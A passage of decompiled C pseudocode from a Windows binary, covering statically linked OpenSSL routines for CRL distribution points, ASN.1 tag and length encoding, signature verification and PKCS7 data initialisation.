    if ( ++v10 >= sub_426A30((int)a3) )
      return v3;
  }
  if ( v7 < 0 )
    goto LABEL_20;
  if ( !strcmp(v5, "onlyuser") )
  {
    v8 = sub_44D2D0((int)v4, (_DWORD *)(v3 + 4));
    goto LABEL_16;
  }
  if ( !strcmp(v5, "onlyCA") )
  {
    v8 = sub_44D2D0((int)v4, (_DWORD *)(v3 + 8));
    goto LABEL_16;
  }
  if ( !strcmp(v5, "onlyAA") )
  {
    v8 = sub_44D2D0((int)v4, (_DWORD *)(v3 + 20));
    goto LABEL_16;
  }
  if ( !strcmp(v5, "indirectCRL") )
  {
    v8 = sub_44D2D0((int)v4, (_DWORD *)(v3 + 16));
    goto LABEL_16;
  }
  if ( !strcmp(v5, "onlysomereasons") )
  {
    v8 = sub_431B00((signed int **)(v3 + 12), v6);
LABEL_16:
    if ( !v8 )
      goto LABEL_20;
    goto LABEL_17;
  }
  sub_408310(34, 157, 106, (int)"crypto\\x509v3\\v3_crld.c", 398);
  sub_408610(6, "section:", *v4, ",name:", v4[1], ",value:", v4[2]);
LABEL_20:
  sub_42FEF0(v3, (int)&unk_506094);
  return 0;
}

//----- (00432800) --------------------------------------------------------
int __usercall sub_432800@<eax>(int a1@<edx>, _DWORD *a2@<ecx>, _BYTE **a3@<ebx>, unsigned int *a4)
{
  _BYTE *v4; // eax
  unsigned int v6; // esi
  char v8; // dl
  unsigned int v9; // ecx
  _BYTE *v10; // eax

  v4 = *a3;
  v6 = 0;
  if ( a1 < 1 )
    return 0;
  if ( *v4 == 0x80 )
  {
    *a2 = 1;
    *a3 = v4 + 1;
    *a4 = 0;
    return 1;
  }
  *a2 = 0;
  v8 = *v4 & 0x80;
  v9 = *v4 & 0x7F;
  v10 = v4 + 1;
  if ( !v8 )
  {
    v6 = v9;
    goto LABEL_15;
  }
  if ( a1 - 1 < (int)(v9 + 1) )
    return 0;
  for ( ; v9; --v9 )
  {
    if ( *v10 )
      break;
    ++v10;
  }
  if ( v9 > 4 )
    return 0;
  if ( v9 )
  {
    do
    {
      --v9;
      v6 = (unsigned __int8)*v10++ | (v6 << 8);
    }
    while ( v9 );
LABEL_15:
    if ( v6 > 0x7FFFFFFF )
      return 0;
  }
  *a3 = v10;
  *a4 = v6;
  return 1;
}

//----- (00432890) --------------------------------------------------------
int __cdecl sub_432890(_BYTE **a1)
{
  _BYTE *v1; // eax

  v1 = *a1;
  *v1++ = 0;
  *v1 = 0;
  *a1 = v1 + 1;
  return 2;
}

//----- (004328B0) --------------------------------------------------------
int __cdecl sub_4328B0(int a1, int a2, int a3)
{
  int v3; // eax
  int v5; // ecx
  int v6; // eax
  int i; // ecx

  v3 = 1;
  if ( a2 < 0 )
    return -1;
  v5 = a3;
  if ( a3 >= 31 )
  {
    do
    {
      v5 >>= 7;
      ++v3;
    }
    while ( v5 > 0 );
  }
  if ( a1 == 2 )
  {
    v6 = v3 + 3;
  }
  else
  {
    v6 = v3 + 1;
    if ( a2 > 127 )
    {
      for ( i = a2; i > 0; i >>= 8 )
        ++v6;
    }
  }
  if ( v6 >= 0x7FFFFFFF - a2 )
    return -1;
  else
    return a2 + v6;
}
// 4328CC: conditional instruction was optimized away because %arg_8.4>=1F
// 4328EE: conditional instruction was optimized away because %arg_4.4>=80

//----- (00432910) --------------------------------------------------------
int __cdecl sub_432910(int a1, const char *Src, signed int Size)
{
  signed int v3; // edi
  void *v5; // ebx
  void *v6; // eax

  v3 = Size;
  if ( Size < 0 )
  {
    if ( !Src )
      return 0;
    v3 = strlen(Src);
  }
  if ( *(_DWORD *)a1 > v3 && *(_DWORD *)(a1 + 8)
    || (v5 = *(void **)(a1 + 8),
        v6 = sub_413500(v5, v3 + 1, (int)"crypto\\asn1\\asn1_lib.c", 276),
        (*(_DWORD *)(a1 + 8) = v6) != 0) )
  {
    *(_DWORD *)a1 = v3;
    if ( Src )
    {
      memcpy(*(void **)(a1 + 8), Src, v3);
      *(_BYTE *)(v3 + *(_DWORD *)(a1 + 8)) = 0;
    }
    return 1;
  }
  else
  {
    sub_408310(13, 186, 65, (int)"crypto\\asn1\\asn1_lib.c", 278);
    *(_DWORD *)(a1 + 8) = v5;
    return 0;
  }
}

//----- (004329C0) --------------------------------------------------------
int __cdecl sub_4329C0(int a1, int a2, int a3)
{
  int result; // eax

  sub_413490(*(void **)(a1 + 8));
  *(_DWORD *)(a1 + 8) = a2;
  *(_DWORD *)a1 = a3;
  return result;
}

//----- (004329F0) --------------------------------------------------------
_DWORD *__cdecl sub_4329F0(int a1)
{
  _DWORD *result; // eax

  result = sub_413430(0x10u);
  if ( result )
  {
    result[1] = a1;
  }
  else
  {
    sub_408310(13, 130, 65, (int)"crypto\\asn1\\asn1_lib.c", 310);
    return 0;
  }
  return result;
}

//----- (00432A30) --------------------------------------------------------
void __cdecl sub_432A30(void **Block)
{
  if ( Block )
  {
    if ( ((_BYTE)Block[3] & 0x10) == 0 )
      sub_413490(Block[2]);
    if ( *((char *)Block + 12) >= 0 )
      sub_413490(Block);
  }
}

//----- (00432A70) --------------------------------------------------------
void __cdecl sub_432A70(void *Block)
{
  _BYTE *v1; // eax

  if ( Block )
  {
    v1 = (_BYTE *)*((_DWORD *)Block + 2);
    if ( v1 )
    {
      if ( (*((_BYTE *)Block + 12) & 0x10) != 0 )
      {
LABEL_7:
        if ( *((char *)Block + 12) >= 0 )
          sub_413490(Block);
        return;
      }
      sub_4139E0(v1, *(_DWORD *)Block);
    }
    if ( (*((_BYTE *)Block + 12) & 0x10) == 0 )
      sub_413490(*((void **)Block + 2));
    goto LABEL_7;
  }
}

//----- (00432AD0) --------------------------------------------------------
int __cdecl sub_432AD0(unsigned int *a1, _DWORD *a2)
{
  unsigned int v2; // ecx
  int result; // eax
  unsigned __int8 *v4; // edx
  unsigned __int8 *v5; // esi
  int v6; // eax

  v2 = *a1;
  result = *a1 - *a2;
  if ( *a1 == *a2 )
  {
    v4 = (unsigned __int8 *)a2[2];
    v5 = (unsigned __int8 *)a1[2];
    if ( v2 < 4 )
    {
LABEL_5:
      if ( !v2 )
        goto LABEL_14;
    }
    else
    {
      while ( *(_DWORD *)v5 == *(_DWORD *)v4 )
      {
        v2 -= 4;
        v4 += 4;
        v5 += 4;
        if ( v2 < 4 )
          goto LABEL_5;
      }
    }
    v6 = *v5 - *v4;
    if ( v6 )
      goto LABEL_13;
    if ( v2 <= 1 )
      goto LABEL_14;
    v6 = v5[1] - v4[1];
    if ( v6 )
      goto LABEL_13;
    if ( v2 <= 2 )
      goto LABEL_14;
    v6 = v5[2] - v4[2];
    if ( v6 )
    {
LABEL_13:
      result = (v6 >> 31) | 1;
      goto LABEL_15;
    }
    if ( v2 > 3 )
    {
      v6 = v5[3] - v4[3];
      goto LABEL_13;
    }
LABEL_14:
    result = 0;
LABEL_15:
    if ( !result )
      return a1[1] - a2[1];
  }
  return result;
}

//----- (00432B60) --------------------------------------------------------
int __cdecl sub_432B60(int a1)
{
  return *(_DWORD *)(a1 + 8);
}

//----- (00432B70) --------------------------------------------------------
int __cdecl sub_432B70(_BYTE **a1, unsigned int *a2, int *a3, int *a4, int a5)
{
  _BYTE *v5; // eax
  int v6; // edx
  int v7; // ecx
  int v8; // edi
  char *v9; // eax
  int v10; // esi
  char v11; // dl
  int i; // ecx
  int v13; // edx
  bool v14; // zf
  int v15; // esi
  int v16; // ebp
  int v17; // ebx
  char *v19; // esi
  char *v20; // [esp+10h] [ebp-Ch] BYREF
  int v21; // [esp+14h] [ebp-8h]
  int v22; // [esp+18h] [ebp-4h] BYREF

  v5 = *a1;
  if ( !a5 )
    goto LABEL_14;
  v6 = *v5 & 0x20;
  v7 = *v5 & 0x1F;
  v8 = *v5 & 0xC0;
  v9 = v5 + 1;
  v21 = v6;
  if ( v7 == 31 )
  {
    v10 = a5 - 1;
    if ( a5 == 1 )
    {
LABEL_14:
      sub_408310(13, 114, 123, (int)"crypto\\asn1\\asn1_lib.c", 100);
      return 128;
    }
    v11 = *v9;
    for ( i = 0; *v9 < 0; v11 = *v9 )
    {
      i = v11 & 0x7F | (i << 7);
      ++v9;
      if ( !--v10 || i > 0xFFFFFF )
        goto LABEL_14;
    }
    v13 = (i << 7) | *v9++ & 0x7F;
    v7 = v13;
    v15 = v10 - 1;
    v14 = v15 == 0;
  }
  else
  {
    v14 = a5 == 1;
    v15 = a5 - 1;
  }
  v20 = v9;
  if ( v14 )
    goto LABEL_14;
  *a3 = v7;
  *a4 = v8;
  if ( !sub_432800(v15, &v22, &v20, a2) )
    goto LABEL_14;
  v16 = v22;
  v17 = v21;
  if ( v22 )
  {
    if ( (v21 & 0x20) == 0 )
      goto LABEL_14;
  }
  v19 = v20;
  if ( (int)*a2 > a5 + *a1 - v20 )
  {
    sub_408310(13, 114, 155, (int)"crypto\\asn1\\asn1_lib.c", 90);
    v17 |= 0x80u;
  }
  *a1 = v19;
  return v17 | v16;
}

//----- (00432CA0) --------------------------------------------------------
int __cdecl sub_432CA0(_BYTE **a1, int a2, int a3, int a4, char a5)
{
  _BYTE *v5; // ecx
  int v6; // ebx
  int result; // eax
  _BYTE *v8; // ecx
  _BYTE *v9; // ecx
  int i; // edx
  int v11; // edi
  int v12; // esi
  int v13; // edx
  int j; // esi
  _BYTE *v15; // ecx
  int k; // esi

  v5 = *a1;
  v6 = a4;
  result = a5 & 0xC0 | (a2 != 0 ? 0x20 : 0);
  if ( a4 >= 31 )
  {
    *v5 = result | 0x1F;
    v9 = v5 + 1;
    result = 0;
    for ( i = a4; i > 0; i >>= 7 )
      ++result;
    v11 = result;
    if ( result > 0 )
    {
      v12 = result - 1;
      do
      {
        v9[--result] = v6 & 0x7F;
        if ( result != v12 )
          v9[result] = v6 & 0x7F | 0x80;
        v6 >>= 7;
      }
      while ( result > 0 );
    }
    v8 = &v9[v11];
  }
  else
  {
    *v5 = result | a4 & 0x1F;
    v8 = v5 + 1;
  }
  if ( a2 == 2 )
  {
    result = (int)a1;
    *v8 = 0x80;
    *a1 = v8 + 1;
  }
  else
  {
    v13 = a3;
    if ( a3 > 127 )
    {
      result = 0;
      for ( j = a3; j > 0; j >>= 8 )
        ++result;
      *v8 = result | 0x80;
      v15 = v8 + 1;
      for ( k = result; result > 0; v13 >>= 8 )
        v15[--result] = v13;
      *a1 = &v15[k];
    }
    else
    {
      *v8 = a3;
      *a1 = v8 + 1;
    }
  }
  return result;
}
// 432D40: conditional instruction was optimized away because %arg_8.4>=80
// 432CE0: conditional instruction was optimized away because %arg_C.4>=1F

//----- (00432D70) --------------------------------------------------------
int __cdecl sub_432D70(int a1, int a2)
{
  int result; // eax

  if ( !a2 )
    return 0;
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a2 + 4);
  result = sub_432910(a1, *(const char **)(a2 + 8), *(_DWORD *)a2);
  if ( result )
  {
    *(_DWORD *)(a1 + 12) &= 0x80u;
    *(_DWORD *)(a1 + 12) |= *(_DWORD *)(a2 + 12) & 0xFFFFFF7F;
    return 1;
  }
  return result;
}

//----- (00432DC0) --------------------------------------------------------
_DWORD *sub_432DC0()
{
  _DWORD *result; // eax

  result = sub_413430(0x10u);
  if ( result )
  {
    result[1] = 4;
  }
  else
  {
    sub_408310(13, 130, 65, (int)"crypto\\asn1\\asn1_lib.c", 310);
    return 0;
  }
  return result;
}

//----- (00432E00) --------------------------------------------------------
void **__cdecl sub_432E00(int a1)
{
  void **v2; // eax
  void **v3; // esi

  if ( !a1 )
    return 0;
  v2 = (void **)sub_413430(0x10u);
  v3 = v2;
  if ( v2 )
  {
    v2[1] = (void *)4;
    if ( sub_432D70((int)v2, a1) )
    {
      return v3;
    }
    else
    {
      sub_432A30(v3);
      return 0;
    }
  }
  else
  {
    sub_408310(13, 130, 65, (int)"crypto\\asn1\\asn1_lib.c", 310);
    return 0;
  }
}

//----- (00432E70) --------------------------------------------------------
int __cdecl sub_432E70(int a1)
{
  return *(_DWORD *)(a1 + 28);
}

//----- (00432E80) --------------------------------------------------------
int __cdecl sub_432E80(int a1)
{
  return *(_DWORD *)(a1 + 40);
}

//----- (00432E90) --------------------------------------------------------
int __cdecl sub_432E90(int a1)
{
  return a1 + 4;
}

//----- (00432EA0) --------------------------------------------------------
int __cdecl sub_432EA0(_DWORD *a1, _DWORD *a2)
{
  int result; // eax
  unsigned int v3; // ecx
  unsigned __int8 *v4; // edx
  unsigned __int8 *v5; // esi
  int v6; // eax

  if ( (!a1[3] || a1[1]) && sub_42C9B0((int)a1, 0) < 0 )
    return -2;
  if ( (!a2[3] || a2[1]) && sub_42C9B0((int)a2, 0) < 0 )
    return -2;
  v3 = a1[4];
  result = v3 - a2[4];
  if ( !result )
  {
    v4 = (unsigned __int8 *)a2[3];
    v5 = (unsigned __int8 *)a1[3];
    if ( v3 < 4 )
    {
LABEL_13:
      if ( !v3 )
        return 0;
    }
    else
    {
      while ( *(_DWORD *)v5 == *(_DWORD *)v4 )
      {
        v3 -= 4;
        v4 += 4;
        v5 += 4;
        if ( v3 < 4 )
          goto LABEL_13;
      }
    }
    v6 = *v5 - *v4;
    if ( v6 )
      return (v6 >> 31) | 1;
    if ( v3 > 1 )
    {
      v6 = v5[1] - v4[1];
      if ( v6 )
        return (v6 >> 31) | 1;
      if ( v3 > 2 )
      {
        v6 = v5[2] - v4[2];
        if ( !v6 )
        {
          if ( v3 > 3 )
          {
            v6 = v5[3] - v4[3];
            return (v6 >> 31) | 1;
          }
          return 0;
        }
        return (v6 >> 31) | 1;
      }
    }
    return 0;
  }
  return result;
}

//----- (00432F70) --------------------------------------------------------
int __cdecl sub_432F70(int a1)
{
  void *v1; // esp
  volatile LONG *v2; // esi
  int result; // eax
  void *Block; // [esp+0h] [ebp-4h] BYREF
  int v5; // [esp+8h] [ebp+4h]

  result = a1;
  if ( a1 )
  {
    v5 = *(_DWORD *)(a1 + 44);
    v1 = alloca(4);
    Block = 0;
    if ( v5 && *(_DWORD *)(v5 + 4) )
    {
      result = *(_DWORD *)(v5 + 8);
      if ( result )
        return result;
      sub_41D3C0((int **)v5, (volatile LONG **)&Block);
      v2 = (volatile LONG *)Block;
      if ( Block )
      {
        sub_408310(11, 119, 68, (int)"crypto\\x509\\x_pubkey.c", 161);
        sub_41CEB0(v2);
      }
    }
    return 0;
  }
  return result;
}

//----- (00432FA0) --------------------------------------------------------
int __cdecl sub_432FA0(int a1, int *a2, int a3, int a4, unsigned int a5)
{
  int v5; // edi
  _BYTE *v7; // ebx
  int v8; // eax
  int v9; // eax
  int (__cdecl *v10)(_BYTE *, int, int, int *, int, int); // eax
  int v11; // esi
  int v12; // edi
  char *v13; // eax
  int *v14; // ebp
  int v15; // esi
  void *Block; // [esp+8h] [ebp-8h] BYREF
  void *v17; // [esp+Ch] [ebp-4h] BYREF

  v5 = a5;
  Block = 0;
  if ( !a5 )
  {
    sub_408310(13, 197, 67, (int)"crypto\\asn1\\a_verify.c", 97);
    return -1;
  }
  if ( *(_DWORD *)(a3 + 4) == 3 && (*(_BYTE *)(a3 + 12) & 7) != 0 )
  {
    sub_408310(13, 197, 220, (int)"crypto\\asn1\\a_verify.c", 102);
    return -1;
  }
  v7 = sub_42B820();
  if ( !v7 )
  {
    sub_408310(13, 197, 65, (int)"crypto\\asn1\\a_verify.c", 108);
    sub_42B840(0);
    return -1;
  }
  v8 = sub_423680(*a2);
  if ( !sub_44BA60(v8, &a5, &v17) )
  {
    sub_408310(13, 197, 199, (int)"crypto\\asn1\\a_verify.c", 114);
LABEL_18:
    sub_42B840(v7);
    return -1;
  }
  if ( a5 )
  {
    v13 = sub_4233A0(a5);
    v14 = (int *)sub_430D80((int)v13);
    if ( !v14 )
    {
      sub_408310(13, 197, 161, (int)"crypto\\asn1\\a_verify.c", 137);
      sub_42B840(v7);
      return -1;
    }
    if ( sub_41CC00(v17) != **(_DWORD **)(v5 + 12) )
    {
      sub_408310(13, 197, 200, (int)"crypto\\asn1\\a_verify.c", 143);
      sub_42B840(v7);
      return -1;
    }
    if ( !sub_44FE40((int)v7, 0, v14, 0, v5) )
    {
      sub_408310(13, 197, 6, (int)"crypto\\asn1\\a_verify.c", 148);
LABEL_29:
      sub_42B840(v7);
      return 0;
    }
  }
  else
  {
    v9 = *(_DWORD *)(v5 + 12);
    if ( !v9 || (v10 = *(int (__cdecl **)(_BYTE *, int, int, int *, int, int))(v9 + 104)) == 0 )
    {
      sub_408310(13, 197, 199, (int)"crypto\\asn1\\a_verify.c", 120);
      goto LABEL_18;
    }
    v11 = v10(v7, a1, a4, a2, a3, v5);
    if ( v11 != 2 )
      goto LABEL_31;
  }
  v12 = sub_42F620(a4, &Block, a1);
  if ( !Block )
  {
    sub_408310(13, 197, 65, (int)"crypto\\asn1\\a_verify.c", 158);
    sub_42B840(v7);
    return -1;
  }
  v15 = sub_42BA10((int)v7);
  sub_4134B0(Block, v12);
  if ( !v15 )
  {
    sub_408310(13, 197, 6, (int)"crypto\\asn1\\a_verify.c", 167);
    sub_42B840(v7);
    return 0;
  }
  if ( sub_450060((int)v7, *(_DWORD *)(a3 + 8), *(_DWORD *)a3) <= 0 )
  {
    sub_408310(13, 197, 6, (int)"crypto\\asn1\\a_verify.c", 174);
    goto LABEL_29;
  }
  v11 = 1;
LABEL_31:
  sub_42B840(v7);
  return v11;
}

//----- (00433280) --------------------------------------------------------
void *sub_433280()
{
  return &unk_5063F8;
}

//----- (00433290) --------------------------------------------------------
int sub_433290()
{
  return sub_42FB20((int)&unk_5063F8);
}

//----- (004332A0) --------------------------------------------------------
void *sub_4332A0()
{
  return &unk_50643C;
}

//----- (004332B0) --------------------------------------------------------
void *sub_4332B0()
{
  return &unk_50650C;
}

//----- (004332C0) --------------------------------------------------------
int sub_4332C0()
{
  return sub_42FB20((int)&unk_50650C);
}

//----- (004332D0) --------------------------------------------------------
void __cdecl sub_4332D0(int a1)
{
  sub_42FEF0(a1, (int)&unk_50650C);
}

//----- (004332F0) --------------------------------------------------------
void *sub_4332F0()
{
  return &unk_50653C;
}

//----- (00433300) --------------------------------------------------------
int sub_433300()
{
  return sub_42FB20((int)&unk_50653C);
}

//----- (00433310) --------------------------------------------------------
void __cdecl sub_433310(int a1)
{
  sub_42FEF0(a1, (int)&unk_50653C);
}

//----- (00433330) --------------------------------------------------------
void *sub_433330()
{
  return &unk_5065AC;
}

//----- (00433340) --------------------------------------------------------
int sub_433340()
{
  return sub_42FB20((int)&unk_5065AC);
}

//----- (00433350) --------------------------------------------------------
void __cdecl sub_433350(int a1)
{
  sub_42FEF0(a1, (int)&unk_5065AC);
}

//----- (00433370) --------------------------------------------------------
int __cdecl sub_433370(int a1, int *a2, int a3, _DWORD *a4)
{
  void *v4; // eax

  v4 = sub_4334D0();
  return sub_4501B0((int)v4, a2, a1, a3, a4);
}

//----- (004333A0) --------------------------------------------------------
int __cdecl sub_4333A0(int a1, int *a2, int a3, _DWORD *a4)
{
  void *v4; // eax

  v4 = sub_41C4C0();
  return sub_4501B0((int)v4, a2, a1, a3, a4);
}

//----- (004333D0) --------------------------------------------------------
void *sub_4333D0()
{
  return &unk_5066E8;
}

//----- (004333E0) --------------------------------------------------------
int __cdecl sub_4333E0(int a1, int *a2)
{
  int v2; // esi
  int result; // eax

  v2 = *a2;
  if ( a1 != 1 )
  {
    if ( a1 == 3 )
    {
      sub_414DC0(3u, v2, (int **)(v2 + 100));
      sub_4535B0(*(_DWORD *)(v2 + 180));
      sub_42C4F0(*(void **)(v2 + 128));
      sub_433350(*(_DWORD *)(v2 + 132));
      sub_431D50(*(_DWORD *)(v2 + 140));
      sub_453570(*(void ***)(v2 + 136));
      sub_433310(*(_DWORD *)(v2 + 144));
      sub_4531F0(*(_DWORD *)(v2 + 148));
      sub_426C00(*(void **)(v2 + 152), sub_451120);
      sub_450290(*(_DWORD *)(v2 + 156));
    }
    return 1;
  }
  *(_DWORD *)(v2 + 112) = 0;
  *(_DWORD *)(v2 + 104) = -1;
  *(_DWORD *)(v2 + 108) = -1;
  *(_DWORD *)(v2 + 128) = 0;
  *(_DWORD *)(v2 + 132) = 0;
  *(_DWORD *)(v2 + 152) = 0;
  *(_DWORD *)(v2 + 156) = 0;
  *(_DWORD *)(v2 + 180) = 0;
  *(_DWORD *)(v2 + 140) = 0;
  result = (int)sub_414B00(3u, v2, (int **)(v2 + 100));
  if ( result )
    return 1;
  return result;
}

//----- (004334D0) --------------------------------------------------------
void *sub_4334D0()
{
  return &unk_506758;
}

//----- (004334E0) --------------------------------------------------------
int __cdecl sub_4334E0(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_506758);
}

//----- (00433520) --------------------------------------------------------
void __cdecl sub_433520(int a1)
{
  sub_42FEF0(a1, (int)&unk_506758);
}

//----- (00433540) --------------------------------------------------------
int __cdecl sub_433540(int a1, int a2, int a3)
{
  return sub_414870((int *)(a1 + 100), a2, a3);
}

//----- (00433550) --------------------------------------------------------
int __cdecl sub_433550(int a1, int a2)
{
  int **v3; // [esp+4h] [ebp+4h]

  v3 = (int **)(a1 + 100);
  if ( *v3 && a2 < sub_426A30((int)*v3) )
    return sub_426A40(*v3, a2);
  else
    return 0;
}

//----- (00433560) --------------------------------------------------------
_DWORD *__cdecl sub_433560(_DWORD *a1, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  if ( a1 )
    *a1 = a3 + 80;
  result = a2;
  if ( a2 )
    *a2 = a3 + 72;
  return result;
}

//----- (00433580) --------------------------------------------------------
int __usercall sub_433580@<eax>(int a1@<esi>)
{
  _DWORD *v2; // eax

  if ( sub_423680(*(_DWORD *)(a1 + 16)) == 21 )
    return *(_DWORD *)(a1 + 20);
  if ( (unsigned int)(sub_423680(*(_DWORD *)(a1 + 16)) - 21) > 5 )
  {
    v2 = *(_DWORD **)(a1 + 20);
    if ( v2 )
    {
      if ( *v2 == 4 )
        return v2[1];
    }
  }
  return 0;
}

//----- (004335C0) --------------------------------------------------------
int __usercall sub_4335C0@<eax>(_DWORD **a1@<edi>, int *a2)
{
  void *v2; // eax
  _DWORD *v3; // esi
  int v4; // eax
  char *v5; // eax
  int v6; // eax
  int v8; // [esp-4h] [ebp-8h]

  v2 = sub_4536A0();
  v3 = (_DWORD *)sub_404E70((int)v2);
  if ( !v3 )
  {
    v8 = 60;
LABEL_10:
    sub_408310(33, 125, 32, (int)"crypto\\pkcs7\\pk7_doit.c", v8);
    goto LABEL_11;
  }
  v4 = sub_423680(*a2);
  v5 = sub_4233A0(v4);
  v6 = sub_430D80((int)v5);
  if ( v6 )
  {
    sub_405390(v3, 111, 0, v6);
    if ( *a1 )
    {
      if ( !sub_4054B0(*a1, (int)v3) )
      {
        v8 = 74;
        goto LABEL_10;
      }
    }
    else
    {
      *a1 = v3;
    }
    return 1;
  }
  sub_408310(33, 125, 109, (int)"crypto\\pkcs7\\pk7_doit.c", 66);
LABEL_11:
  sub_404F50(v3);
  return 0;
}

//----- (00433650) --------------------------------------------------------
volatile LONG **__usercall sub_433650@<eax>(int a1@<ebx>, int a2, int a3)
{
  void *v3; // esi
  int v4; // ebp
  volatile LONG **result; // eax
  int *v6; // edi
  size_t Size; // [esp+8h] [ebp-4h] BYREF

  v3 = 0;
  v4 = 0;
  result = (volatile LONG **)sub_432F70(*(_DWORD *)(a1 + 16));
  if ( result )
  {
    result = sub_443D20((int)result, 0);
    v6 = (int *)result;
    if ( result )
    {
      if ( sub_453CD0((int *)result) > 0 )
      {
        if ( sub_443A60((int)v6, -1, 256, 3, 0, a1) > 0 )
        {
          if ( sub_453D40(v6, 0, &Size, a2, a3) > 0 )
          {
            v3 = sub_4133F0(Size);
            if ( v3 )
            {
              if ( sub_453D40(v6, (int)v3, &Size, a2, a3) > 0 )
              {
                sub_4329C0(*(_DWORD *)(a1 + 12), (int)v3, Size);
                v3 = 0;
                v4 = 1;
              }
            }
            else
            {
              sub_408310(33, 132, 65, (int)"crypto\\pkcs7\\pk7_doit.c", 120);
            }
          }
        }
        else
        {
          sub_408310(33, 132, 152, (int)"crypto\\pkcs7\\pk7_doit.c", 110);
        }
      }
      sub_443A10((volatile LONG **)v6);
      sub_413490(v3);
      return (volatile LONG **)v4;
    }
  }
  return result;
}

//----- (00433780) --------------------------------------------------------
void *__cdecl sub_433780(_DWORD *a1, void *a2)
{
  int v2; // esi
  _DWORD *v3; // edi
  unsigned int *v4; // ebx
  int *v5; // ebp
  void *result; // eax
  int v7; // eax
  int v8; // eax
  int v9; // esi
  _DWORD *v10; // eax
  int v11; // edx
  int v12; // eax
  char ***v13; // ecx
  int v14; // eax
  int v15; // edx
  int v16; // eax
  char ***v17; // ecx
  int v18; // eax
  int v19; // eax
  int *v20; // eax
  void *v21; // eax
  _DWORD *v22; // eax
  int v23; // esi
  int v24; // eax
  char **v25; // eax
  char ***v26; // ebp
  int v27; // eax
  int *v28; // esi
  int v29; // ebp
  int v30; // eax
  void *v31; // eax
  _DWORD *v32; // eax
  void *v33; // eax
  _DWORD *v34; // eax
  void *Block; // [esp+10h] [ebp-74h] BYREF
  void *v36; // [esp+14h] [ebp-70h]
  void *v37; // [esp+18h] [ebp-6Ch] BYREF
  void *v38; // [esp+1Ch] [ebp-68h]
  _DWORD *v39; // [esp+20h] [ebp-64h]
  char ***v40; // [esp+24h] [ebp-60h]
  int *v41; // [esp+28h] [ebp-5Ch]
  int v42; // [esp+2Ch] [ebp-58h]
  char Src[16]; // [esp+30h] [ebp-54h] BYREF
  _BYTE v44[64]; // [esp+40h] [ebp-44h] BYREF

  v2 = 0;
  v3 = a1;
  v4 = 0;
  v5 = 0;
  v39 = a1;
  v36 = a2;
  Block = 0;
  v38 = 0;
  v37 = 0;
  v41 = 0;
  v40 = 0;
  v42 = 0;
  if ( !a1 )
  {
    sub_408310(33, 105, 143, (int)"crypto\\pkcs7\\pk7_doit.c", 206);
    return 0;
  }
  if ( !a1[5] )
  {
    sub_408310(33, 105, 122, (int)"crypto\\pkcs7\\pk7_doit.c", 220);
    return 0;
  }
  v7 = sub_423680(a1[4]);
  a1[2] = 0;
  switch ( v7 )
  {
    case 21:
      goto LABEL_13;
    case 22:
      v8 = a1[5];
      v5 = *(int **)(v8 + 4);
      v9 = *(_DWORD *)(v8 + 20);
      goto LABEL_12;
    case 23:
      v14 = a1[5];
      v15 = *(_DWORD *)(v14 + 4);
      v16 = *(_DWORD *)(v14 + 8);
      v4 = *(unsigned int **)(v16 + 12);
      v17 = *(char ****)(v16 + 4);
      v41 = (int *)v15;
      v40 = v17;
      if ( v4 )
        goto LABEL_13;
      sub_408310(33, 105, 116, (int)"crypto\\pkcs7\\pk7_doit.c", 247);
      goto LABEL_53;
    case 24:
      v10 = (_DWORD *)a1[5];
      v11 = v10[6];
      v5 = (int *)v10[1];
      v12 = v10[5];
      v4 = *(unsigned int **)(v12 + 12);
      v13 = *(char ****)(v12 + 4);
      v41 = (int *)v11;
      v40 = v13;
      if ( v4 )
        goto LABEL_13;
      sub_408310(33, 105, 116, (int)"crypto\\pkcs7\\pk7_doit.c", 238);
      goto LABEL_53;
    case 25:
      v18 = a1[5];
      v9 = *(_DWORD *)(v18 + 8);
      v37 = *(void **)(v18 + 4);
LABEL_12:
      v19 = sub_433580(v9);
      v2 = 0;
      v42 = v19;
LABEL_13:
      if ( sub_426A30((int)v5) <= 0 )
        goto LABEL_17;
      break;
    default:
      sub_408310(33, 105, 112, (int)"crypto\\pkcs7\\pk7_doit.c", 258);
      goto LABEL_53;
  }
  do
  {
    v20 = (int *)sub_426A40(v5, v2);
    if ( !sub_4335C0((_DWORD **)&Block, v20) )
      goto LABEL_53;
    ++v2;
  }
  while ( v2 < sub_426A30((int)v5) );
  v3 = v39;
LABEL_17:
  if ( v37 )
  {
    if ( !sub_4335C0((_DWORD **)&Block, (int *)v37) )
    {
LABEL_53:
      sub_405550((volatile LONG *)Block);
      sub_405550((volatile LONG *)v38);
      return 0;
    }
    v3 = v39;
  }
  if ( v4 )
  {
    v21 = sub_454120();
    v22 = (_DWORD *)sub_404E70((int)v21);
    v38 = v22;
    if ( !v22 )
    {
      sub_408310(33, 105, 32, (int)"crypto\\pkcs7\\pk7_doit.c", 276);
      goto LABEL_53;
    }
    sub_405390(v22, 129, 0, (int)&v37);
    v39 = (_DWORD *)sub_432B60((int)v4);
    v23 = sub_407400((int)v4);
    v24 = sub_4076A0(v4);
    v25 = sub_423310(v24);
    v26 = v40;
    *v40 = v25;
    if ( v23 > 0 && sub_406FF0() <= 0 )
      goto LABEL_53;
    if ( sub_406270((int **)v37, (int *)v4, 0, 0, 0, 1) <= 0
      || sub_406120((int)v37, (int)v44) <= 0
      || sub_406270((int **)v37, 0, 0, (int)v44, Src, 1) <= 0 )
    {
      goto LABEL_53;
    }
    if ( v23 > 0 )
    {
      if ( !v26[1] )
      {
        v27 = sub_42C600();
        v26[1] = (char **)v27;
        if ( !v27 )
          goto LABEL_53;
      }
      if ( sub_4078F0((int)v37, v26[1]) < 0 )
        goto LABEL_53;
    }
    v28 = v41;
    v29 = 0;
    if ( sub_426A30((int)v41) > 0 )
    {
      do
      {
        v30 = sub_426A40(v28, v29);
        if ( (int)sub_433650(v30, (int)v44, (int)v39) <= 0 )
          goto LABEL_53;
      }
      while ( ++v29 < sub_426A30((int)v28) );
    }
    sub_4139E0(v44, (unsigned int)v39);
    if ( Block )
      sub_4054B0(Block, (int)v38);
    else
      Block = v38;
    v38 = 0;
  }
  if ( !v36 )
  {
    if ( sub_423680(v3[4]) == 22 && sub_4344E0(v3, 2, 0) )
    {
      v31 = sub_454070();
      v32 = (_DWORD *)sub_404E70((int)v31);
    }
    else
    {
      if ( !v42 || *(int *)v42 <= 0 )
      {
LABEL_47:
        v33 = sub_4067E0();
        v34 = (_DWORD *)sub_404E70((int)v33);
        v36 = v34;
        if ( !v34 )
          goto LABEL_53;
